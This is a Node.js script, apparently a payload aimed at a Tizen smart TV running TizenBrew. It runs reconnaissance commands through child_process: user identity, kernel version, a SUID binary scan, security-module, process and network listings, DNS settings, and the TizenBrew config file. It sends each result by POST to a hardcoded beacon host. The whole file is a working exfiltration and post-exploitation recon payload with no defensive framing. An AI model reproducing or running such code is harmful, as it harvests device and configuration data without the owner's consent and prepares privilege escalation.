const fetch = require('node-fetch');
const BEACON_URL = 'http://192.168.0.73:8008/tv-results';

function beacon(obj) {
    fetch(BEACON_URL, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(obj)
    }).catch(function(e) { console.log('beacon fail: ' + e.message); });
}

// Step 1: confirm module loaded
beacon({source: "tv-exfil-d", step: 1, msg: "module loaded", ts: new Date().toISOString()});

async function main() {
    try {
        // Step 2: test child_process
        var cp;
        try {
            cp = require('child_process');
            beacon({source: "tv-exfil-d", step: 2, msg: "child_process available", ts: new Date().toISOString()});
        } catch(e) {
            beacon({source: "tv-exfil-d", step: 2, msg: "child_process BLOCKED: " + e.message, ts: new Date().toISOString()});
            return;
        }

        var run = function(cmd, timeout) {
            return new Promise(function(resolve) {
                cp.exec(cmd, {timeout: timeout || 8000}, function(err, stdout, stderr) {
                    resolve({cmd: cmd, err: err ? err.message : null, out: stdout ? stdout.substring(0, 2000) : '', err_out: stderr ? stderr.substring(0, 500) : ''});
                });
            });
        };

        var results = {source: "tv-exfil-d", ts: new Date().toISOString(), cmds: []};

        // Step 3: basic commands
        results.cmds.push(await run('id'));
        beacon({source: "tv-exfil-d", step: 3, msg: "id done", data: results.cmds[results.cmds.length-1], ts: new Date().toISOString()});

        results.cmds.push(await run('uname -a'));
        beacon({source: "tv-exfil-d", step: 4, msg: "uname done", data: results.cmds[results.cmds.length-1], ts: new Date().toISOString()});

        // Step 5: SUID scan (slow)
        results.cmds.push(await run('find / -perm -4000 -type f 2>/dev/null', 15000));
        beacon({source: "tv-exfil-d", step: 5, msg: "suid done", data: results.cmds[results.cmds.length-1], ts: new Date().toISOString()});

        // Step 6: SMACK + processes + network
        results.cmds.push(await run('cat /proc/security/lsm 2>/dev/null; ls /sys/fs/ 2>/dev/null'));
        results.cmds.push(await run('ps 2>/dev/null | head -40'));
        results.cmds.push(await run('cat /proc/net/route 2>/dev/null; cat /etc/resolv.conf 2>/dev/null'));

        // Step 7: TizenBrew config
        results.cmds.push(await run('cat /home/owner/share/.tizenbrewConfig.json 2>/dev/null'));

        // Step 8: final beacon with all results
        beacon({source: "tv-exfil-d", step: 8, msg: "ALL DATA", data: results, ts: new Date().toISOString()});
    } catch(e) {
        beacon({source: "tv-exfil-d", step: "ERR", msg: e.message, stack: e.stack, ts: new Date().toISOString()});
    }
}

main();
